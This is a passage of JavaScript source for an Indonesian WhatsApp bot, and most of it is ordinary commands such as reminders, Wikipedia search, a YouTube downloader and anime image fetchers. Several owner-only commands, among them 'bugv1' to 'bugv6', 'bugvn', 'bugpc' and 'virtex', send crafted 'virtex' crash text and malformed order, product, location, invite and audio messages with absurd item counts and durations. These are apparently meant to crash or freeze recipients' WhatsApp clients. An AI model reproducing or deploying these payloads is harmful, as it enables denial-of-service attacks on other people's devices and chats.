                            'rows': [{
                                'title': '' + emoji2(prefix),
                                'rowId': 'ApaSih'
                            }]
                        }]
                    }
                }, {
                    'quoted': floc
                }), xdev.relayWAMessage(res);
                break
           
           
           
          
           
           
           case 'bugbutton':
         if (!isOwner) return sendvn(wuy)
    sendMess(`*Sending...*`, text)
gambar = fs.readFileSync('./stik/sampah.jpg')
mhan = await xdev.prepareMessage(from, gambar, image, {thumbnail:fs.readFileSync(`./stik/bro.jpg`)})
gbutsan = [
  {buttonId: 'oke', buttonText: {displayText: `${virtex8(prefix)}`}, type: 1},
  {buttonId: 'oke', buttonText: {displayText: `${philip(prefix)}`}, type: 1}
]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: philip(prefix),
    footerText: `${virtex7(prefix)}`,
    buttons: gbutsan,
    headerType: 1
}
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
        
        caption: virtex7(prefix),
            quoted: ftroli, contextInfo: forward})
           	break
          
          
          
          
          
          
          
          case 'tdm1':
         if (!isOwner) return sendvn(wuy)
                var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': tdm13(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)
         xdev.sendMessage(from, tdm7(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                })
                
                break;
                
                
          
          
          
          
          
           
           case 'bugv1':
         if (!isOwner) return sendvn(wuy)
              {
                var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': virtex7(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)

                }
                break;
                
                
                
                
                
                
                case 'bugv2':
            if (!isOwner) return sendvn(wuy)
                             xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo:forward})
                            break
                
                case 'bugloc':
               if (!isOwner) return sendvn(wuy)
                             xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: sampah,
                              }, location,
                              {quoted: {
                             key: {
                               participant: '0@s.whatsapp.net'
                             },
                           message: {
                        orderMessage: {
                          itemCount: 2,
                               status: 1,
                       surface: 10,
                      message: 'NOPE',
                            orderTitle: fake,
                             sellerJid:'0@s.whatsapp.net'}
                             }},
                             contextInfo: forward})
                            break

                
                case 'bugv3':
                   if (!isOwner) return sendvn(wuy)
                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '🔥',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': '𝗛𝗮𝗹𝗼 𝗴𝗮𝗲𝘀',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': sampah,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 3,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': virgam,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                case 'vweb':
                         if (!isOwner) return sendvn(wuy)
                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '🔥',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': '𝗛𝗮𝗹𝗼 𝗴𝗮𝗲𝘀',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': davizin,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 3,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': sampah,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                
                
           case 'bugv4':
                    if (!isOwner) return sendvn(wuy)
                    if(!isGroup) return reply("Gunakan bug ini di chat")
           {                
                    xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })             
                    }
                    break;
                    
                    
           case 'bugpc':
                    if (!isOwner) return sendvn(wuy)
                    if(!isGroup) return reply("Gunakan bug ini di chat")
           {                
                    xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': fs.readFileSync('./stik/sampah.jpg')
                    }, MessageType.groupInviteMessage, {
                        'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': 4,
                                    'status': 1,
                                    'surface': 1,
                                    'orderTitle': fake,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }
                    })                  
                    }
                    break;
                    
                    
                    
                    
                    
                    
           
           case 'bugv5':
                    if (!isOwner) return sendvn(wuy)
           {
              
               hmm4 = fs.readFileSync('./stik/trava1.jpg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                  contextInfo: forward
                    }), 
                  xdev.relayWAMessage(res)
                
                    }
                    break;
         
           
           case 'bugkatalog':   
                    if (!isOwner) return sendvn(wuy)
           {
              
               hmm4 = fs.readFileSync('./stik/bro.jpg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,                    
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                        'quoted': {
                            'key': {
                                'fromMe': false,
                                'participant':  `0@s.whatsapp.net`,
                                'remoteJid': '0@s.whatsapp.net',
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': 5,
                                    'status': 1,
                                    'surface': 1,
                                    'message': 'halo ges',
                                    'orderTitle': fake,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }
                    }), 
                  xdev.relayWAMessage(res)
                
                    }
                    break;
         
           
     
           
           case 'bugv6':
                    if (!isOwner) return sendvn(wuy)
           var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake1,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: forward
                });
                 xdev.relayWAMessage(kirin)
                 break
           
           
           
           
           
           
           
case 'bugimg':  
         if (!isOwner) return sendvn(wuy)
                const ahyamete = fs.readFileSync(`./stik/bro.jpg`)
                xdev.sendMessage(from, ahyamete, image, 
                      {
                    'quoted': {
                        'key': {
                            'participant': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 9999999999,
                                'status': 1,
                                'surface': 1,
                                'message': 'halo ges',
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'caption': virtex5(prefix),
                    'thumbnail': virgam
                })
                break;




                 





           
           
     
           case 'bugvn':
                    if (!isOwner) return sendvn(wuy)
                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
                xdev.sendMessage(from, iya2, audio, {
                    'quoted': {
                        'key': {
                            'participant': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 482007,
                                'status': 1,
                                'thumbnail': virgam,
                                'surface': 1,
                                'message': virtex7(prefix),
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net",
                                'sendEphemeral': true,
                            }
                        }
                    },
                    'filename': '' + ngazap(prefix),
                    'mimetype': 'audio/mp4',
                    'duration': '359996400',
                    'ptt': true
                });
                break;
           

           
           
           
           
           
           
           
       
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           case 'virtex':
                    if (!isOwner) return sendvn(wuy)
           {
           reply('*Loading...*')
               await xdev.sendMessage(from, virtexbytsukasa(prefix), text)                
               await xdev.sendMessage(from, virtex(prefix), text)            
                await xdev.sendMessage(from, virtex2(prefix), text)       
                 await xdev.sendMessage(from, virtex3(prefix), text)    
                await xdev.sendMessage(from, virtex4(prefix), text)              
                await xdev.sendMessage(from, virtex5(prefix), text)     
                await xdev.sendMessage(from, virtex6(prefix), text)
                await xdev.sendMessage(from, virtex7(prefix), text)   
                await xdev.sendMessage(from, virtex8(prefix), text)            
                await xdev.sendMessage(from, virtex9(prefix), text)       
                 await xdev.sendMessage(from, virtex10(prefix), text)    
                await xdev.sendMessage(from, virtex11(prefix), text)              
                await xdev.sendMessage(from, virtex12(prefix), text)     
                await xdev.sendMessage(from, philip(prefix), text)
                 await xdev.sendMessage(from, slayer(prefix), text) 
                 await xdev.sendMessage(from, ngazap(prefix), text)
           }
                break;
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           case 'kodebahasa':
let LANGUAGES = `
  'af': 'Afrikaans',
  'sq': 'Albanian',
  'ar': 'Arabic',
  'hy': 'Armenian',
  'ca': 'Catalan',
  'zh': 'Chinese',
  'zh-cn': 'Chinese (Mandarin/China)',
  'zh-tw': 'Chinese (Mandarin/Taiwan)',
  'zh-yue': 'Chinese (Cantonese)',
  'hr': 'Croatian',
  'cs': 'Czech',
  'da': 'Danish',
  'nl': 'Dutch',
  'en': 'English',
  'en-au': 'English (Australia)',
  'en-uk': 'English (United Kingdom)',
  'en-us': 'English (United States)',
  'eo': 'Esperanto',
  'fi': 'Finnish',
  'fr': 'French',
  'de': 'German',
  'el': 'Greek',
  'ht': 'Haitian Creole',
  'hi': 'Hindi',
  'hu': 'Hungarian',
  'is': 'Icelandic',
  'id': 'Indonesian',
  'it': 'Italian',
  'ja': 'Japanese',
  'ko': 'Korean',
  'la': 'Latin',
  'lv': 'Latvian',
  'mk': 'Macedonian',
  'no': 'Norwegian',
  'pl': 'Polish',
  'pt': 'Portuguese',
  'pt-br': 'Portuguese (Brazil)',
  'ro': 'Romanian',
  'ru': 'Russian',
  'sr': 'Serbian',
  'sk': 'Slovak',
  'es': 'Spanish',
  'es-es': 'Spanish (Spain)',
  'es-us': 'Spanish (United States)',
  'sw': 'Swahili',
  'sv': 'Swedish',
  'ta': 'Tamil',
  'th': 'Thai',
  'tr': 'Turkish',
  'vi': 'Vietnamese',
  'cy': 'Welsh'`
reply(`${LANGUAGES}`)
break
           
           
       
           
         
        
           
           

           case 'status':
case 'stats':
				var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalchat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Charged : ${baterai.isCharge}
Mode : ${publik ? 'public' : 'self'}
Prefix : 「 ${prefa} 」
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${xdev.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${xdev.user.phone.wa_version}
Os Version: ${xdev.user.phone.os_version}

⍟ ────────────────── ⍟`

xdev.sendMessage(from, stamtus, text, {
                    'contextInfo': {  
                        'text': '🔥',
                        'forwardingScore': 1,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title':`*STATUS*`,
                            'body': '',
                            'previewType': 'PHOTO',
                           
                            'thumbnail': sampah,
                            'sourceUrl': ''
                        }
                    }
             })
break
				
           
           
           
           
           
           
           
           case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(dev).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xdev.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : dev;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              xdev.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(dev).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xdev.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
           
           
           
           
     
           
           
           
           
           
           
           
           
           
           case 'anna':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Anna.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
           
           
           
           case 'asunayuki':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Asuna_yuki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
            
            
            
            
            case 'ayuzawa':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Ayuzawa_misaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
           
           
           
           
           case 'chitoge':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Chitoge_kirisaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
           
           
           
           
           case 'emilia':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Emilia.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
           
           
           
           
           case 'erza':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Erza_scarlet.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
           
           
           
           case 'hinata':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Hinata.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
            
            
            
            
            case 'naruto':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Naruto.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
            
            
            
            case 'sasuke':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Sasuke.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           case 'ytdl':
           case 'youtubedl':
           if (isSpammerr) return sendSticker(spam2, sticker)
   
             if (args.length < 1) return reply('Link Nya Mana?')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('aduh error')
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
             result = `*Youtube Downloader*
             
📜 Title : ${res[0].judul}
🎁 Type : mp3/mp4
⚖️ Durasi : ${res[0].size}`
             
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              
              imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
             
              gbutsan = [
  {buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},
  {buttonId:`${prefix}buttons1 ${q}`, buttonText: {displayText:`🎵Audio`},type:1}
]
             
              gbuttonan = {
imageMessage: imageMsg,
    contentText:`${result}`,
    footerText:'Pilih satu format di bawah ini',
    buttons: gbutsan,
    headerType: 4
    }
  await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
            quoted: fmenu, contextInfo: forward})
              fs.unlinkSync(`./ytmp.jpeg`)
              break
           
           
           
           
           
          case 'asupan':
           const rows5 = [{
        "title": 'rikagusriani',
        "rowId": '0'
    }, {
        "title": 'ukhty',
        "rowId": '0'
    }, {
        "title": 'santuy',
        "rowId": '0'
    }, {
        "title": 'geayubi',
        "rowId": '0'
    }, {
        "title": 'bocil',
        "rowId": '0'
    }, {
        "title": 'asupan',
        "rowId": '0'
    }, {
        "title": 'chika',
        "rowId": '0'
    }, {
        "title": 'delvira',
        "rowId": '0'
    }, {
        "title": 'ayu',
        "rowId": '0'
    }, {
        "title": 'bunga',
        "rowId": '0'
    }, {
        "title": 'aura',
        "rowId": '0'
    }, {
        "title": 'nisa',
        "rowId": '0'
    }, {
        "title": 'ziva',
        "rowId": '0'
    }, {
        "title": 'yana',
        "rowId": '0'
    }, {
        "title": 'viona',
        "rowId": '0'
    }, {
        "title": 'syania',
        "rowId": '0'
    }, {
        "title": 'riri',
        "rowId": '0'
    }, {
        "title": 'syifa',
        "rowId": '0'
    }, {
        "title": 'mama_gina',
        "rowId": '0'
    }, {
        "title": 'alcakenya',
        "rowId": '0'
    }, {
        "title": 'mangayutri',
        "rowId": '0'
    }];
    const sections5 = [{
        title: 'Pilih salah satu',
        rows: rows5
    }];
    const listt5 = {
        buttonText: 'SELECT HERE',
        title: `ASUPAN MENU`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 😇`,
        footerText: `Botz its Upgraded`,
        sections: sections5,
        listType: 1
    };
    xdev.sendMessage(from, listt5, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break

           
           
           
           case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: dev, caption: result}).catch(e => {
  reply(result)
})
